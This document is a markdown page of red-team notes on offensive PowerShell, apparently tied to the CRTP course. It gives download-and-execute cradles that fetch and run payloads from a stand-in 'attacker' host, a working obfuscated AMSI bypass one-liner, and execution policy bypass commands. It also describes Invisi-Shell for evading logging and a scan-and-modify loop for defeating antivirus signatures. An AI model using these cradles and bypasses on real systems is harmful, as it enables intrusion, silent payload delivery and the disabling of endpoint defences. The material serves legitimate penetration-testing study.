---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PowerShell

## PowerShell

**PowerShell** **(PS)** is not just `powershell.exe`—it’s an automation framework built on the .NET assembly `System.Management.Automation.dll`. This DLL is the core engine that drives all PS functionality, and can be hosted by any .NET application, not just the shell itself. Think of .NET as the toolbox, the DLL as a power tool, and PS as the app that puts it to work.

PS provides a CLI interface, a scripting language, and a configuration and automation framework. It is cross-platform, scriptable, and integrates deeply with Windows internals, making it ideal for red team operations and post-exploitation tooling.

PS supports flexible script execution, including in-memory loading:

```powershell
# Dot-source a script into the current session
. c:\ad\tools\PowerView.ps1

# Import a module (manifest or binary)
Import-Module c:\ad\tools\ActiveDirectory.psd1

# List commands from a loaded module
Get-Command -Module <ModuleName>
```

## Cradles

A **cradle** is a technique to download and execute PS code directly in memory to avoid writing to disk—commonly used for payload delivery and evasion.

{% tabs %}
{% tab title="PSv3+" %}
```powershell
iex (iwr 'http://attacker/payload.ps1')
```
{% endtab %}

{% tab title="WebClient" %}
Legacy method:

```powershell
iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```
{% endtab %}

{% tab title="XMLHTTP" %}
Less commonly used:

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://webserver/payload.ps1',$false)
$h.send()
iex $h.responseText
```
{% endtab %}

{% tab title="IE COM Object" %}
Older method:

```powershell
$ie=New-Object -ComObject InternetExplorer.Application
$ie.visible=$False
$ie.navigate('http://webserver/payload.ps1')
sleep 5
$response=$ie.Document.body.innerHTML
$ie.quit()
iex $response
```
{% endtab %}
{% endtabs %}

## Security Controls

PS includes several built-in security features:

* **Script Block Logging** records parsed PS code, including decoded/expanded commands. Enabled by default on modern systems.
* **System-Wide Transcription** logs all input/output regardless of host but is rarely deployed. Its logs are stored unprotected in plaintext.
* **AMSI (Anti-Malware Scan Interface)** scans scripts before execution and sends them to the installed AV; bypassable with obfuscation or memory injection.
* **Constrained Language Mode (CLM)** restricts .NET usage and native API access; enforced via AppLocker/WDAC.

<mark style="background-color:yellow;">**Execution Policy**</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">(EP) IS NOT a security feature</mark>; it governs script execution behavior to prevent accidental script execution.

{% tabs %}
{% tab title="AMSI Bypass" %}
Check [AMSI.fail](https://amsi.fail/).

From CRTP:

{% code overflow="wrap" %}
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}
{% endtab %}

{% tab title="Execution Policy Bypass" %}
```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -encodedcommand <base64>
$env:PSExecutionPolicyPreference = "Bypass"
```
{% endtab %}
{% endtabs %}

## Obfuscation & Evasion

### Invisi-Shell

[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) bypasses logging and AMSI by injecting directly into memory using .NET hosting APIs:

{% hint style="warning" %}
Type `exit` to clean up the session!
{% endhint %}

{% tabs %}
{% tab title="Admin Privs" %}
```powershell
RunWithPathAsAdmin.bat
```
{% endtab %}

{% tab title="Low Privs" %}
```powershell
RunWithRegistryNonAdmin.bat
```
{% endtab %}
{% endtabs %}

### Static Signatures

[AmsiTrigger](https://github.com/RythmStick/AMSITrigger) and [DefenderCheck](https://github.com/matterpreter/DefenderCheck) help identify and iteratively sanitize code segments that trigger AV/EDR detections.

{% hint style="success" %}
Scan → Manually modify → Rescan → Repeat until success
{% endhint %}

{% tabs %}
{% tab title="AmsiTrigger" %}
```powershell
AmsiTrigger_x64.exe -i PowerUp.ps1
```
{% endtab %}

{% tab title="DefenderCheck" %}
```powershell
DefenderCheck.exe PowerUp.ps1
```
{% endtab %}
{% endtabs %}

### Invoke-Obfuscation

Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) for on-the-fly  full PS script obfuscation.
